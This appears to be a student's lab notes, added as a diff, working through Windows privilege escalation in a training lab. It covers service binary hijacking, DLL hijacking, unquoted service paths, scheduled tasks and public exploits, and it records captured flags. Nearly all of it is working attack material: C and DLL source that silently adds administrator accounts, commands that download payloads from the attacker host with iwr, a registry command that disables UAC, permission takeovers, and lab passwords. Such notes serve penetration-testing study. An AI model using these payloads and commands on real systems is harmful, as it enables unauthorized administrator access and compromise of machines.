@@ -1,0 +1,269 @@
+Windows privilege escalation
+
+attacker 192.168.49.63
+
+192.168.63.220
+
+nc 192.168.63.220 4444
+powershell
+get-localuser
+
+daveadmin
+
+----------
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
+
+OS{bb385addacae0200111f0082ef9e4da6}
+
+---------
+Service binary hijacking
+
+192.168.63.220
+
+nc 192.168.63.220 4444
+powershell
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+Get-CimInstance : Access denied !
+
+sc query type= service
+Get-Service | Where-Object {$_.Status -eq "Running"}
+
+net user dave
+
+get-localuser
+get-localgroup
+get-localgroupmember adminteam
+get-process
+
+runas /user:backupadmin cmd
+
+retry:
+xfreerdp /u:dave /p:lab /v:192.168.63.220
+
+sc qc mysql
+
+BINARY_PATH_NAME: C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
+
+adduser.c:
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
+python3 -m http.server
+
+powershell
+iwr -uri http://192.168.49.63:8000/adduser.exe -Outfile adduser.exe
+(Invoke-WebRequest)
+move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+
+net stop mysql
+
+powershell
+Get-LocalGroupMember administrators
+
+shutdown /r /t 0
+
+xfreerdp /u:dave2 /p:password123! /v:192.168.63.220
+
+runas /user:daveadmin cmd
+
+get-localgroupmember Administrators
+
+C:\Users\daveadmin\Desktop\flag.txt
+
+access is denied
+
+Run command prompt in administrator
+
+OS{f51e48a0aedd98933ef3a886b2697357}
+
+Remarks:
+takeown /F C:\Users\daveadmin\Desktop /R /D Y
+icacls C:\Users\daveadmin\Desktop /grant dave2:F /T
+
+Disable UAC:
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+
+----------
+DLL hijacking
+
+192.168.63.220
+
+sudo apt install mingw-w64
+
+nc 192.168.63.220 4444
+
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+FileZilla 3.63.1 
+
+xfreerdp /u:dave /p:lab /v:192.168.63.220
+
+C:\tools\Procmon\Procmon64.exe
+
+backupadmin
+admin123admin123!
+
+Process Name is filezilla.exe
+Path contains TextShaping.dll
+
+TextShaping.cpp:
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave3 password123! /add");
+  	    i = system ("net localgroup administrators dave3 /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+
+x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+
+x86_64-w64-mingw32-gcc
+cannot execute 'cc1plus': execvp: No such file or directory compilation terminated
+
+sudo apt-get install mingw-w64
+Err:1 http://http.kali.org/kali kali-rolling/main amd64 gcc-mingw-w64-i686-win32 amd64 14.2.0-19+27+b1
+  404  Not Found [IP: 54.39.128.230 80]
+
+sudo apt-get install g++
+
+---------
+Unquoted service paths
+
+192.168.63.220
+
+nc 192.168.63.220 4444
+
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+GammaService
+
+Start-Service GammaService
+Stop-Service GammaService
+Restart-Service GammaService
+
+icacls "C:\Program Files\Enterprise Apps"
+
+python3 -m http.server 80
+
+powershell
+iwr -uri http://192.168.49.63/adduser.exe -Outfile Current.exe
+copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+
+net user
+net localgroup administrators
+
+Start-Service : Cannot find any service with service name 'GammaService'
+
+-------------
+Scheduled tasks
+
+192.168.63.220
+
+nc 192.168.63.220 4444
+
+Get-ScheduledTask
+schtasks /query /fo LIST /v
+
+TaskName: \Microsoft\CacheCleanup
+
+schtasks /query /tn "\Microsoft\CacheCleanup" /v /fo LIST
+
+icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+
+iwr -uri http://192.168.49.63/adduser.exe -Outfile BackendCacheCleanup.exe
+copy .\BackendCacheCleanup.exe C:\Users\steve\Pictures\
+
+Access is denied !
+
+schtasks /run /tn "\Microsoft\CacheCleanup"
+
+xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.63.220
+
+(in command prompt, in cursor position, press the Esc key to clear the input and get a blank line)
+
+runas /user:dave2 cmd
+
+xfreerdp /u:dave2 /p:password123! /v:192.168.63.220
+
+Run command prompt in administrator
+
+C:\Users\daveadmin\Desktop\flag.txt
+
+OS{0cdea2d72700e98d74fcd2cf204d5209}
+
+-----------
+Using exploits
+
+192.168.63.220
+
+whoami /priv
+
+steve
+
+xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.63.220
+
+CVE-2023-29360.exe
+
+whoami
+nt authority\system
+
+OS{f1b11e13d1128244d66b9726bf3eec36}
+
+---------------
+192.168.63.220
+
+wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+python3 -m http.server 80
+
+nc 192.168.63.220 4444
+
+whoami /priv
+
+powershell
+iwr -uri http://192.168.49.63/SigmaPotato.exe -OutFile SigmaPotato.exe
+
+.\SigmaPotato "net user dave4 lab /add"
+net user
+.\SigmaPotato "net localgroup Administrators dave4 /add"
+net localgroup Administrators
+
+xfreerdp /u:dave4 /p:lab /v:192.168.63.220
+
+Run command prompt in administrator
+
+C:\Users\daveadmin\Desktop\flag.txt
+
+OS{64bbc7325f5a77f326abb4330b915972}
+
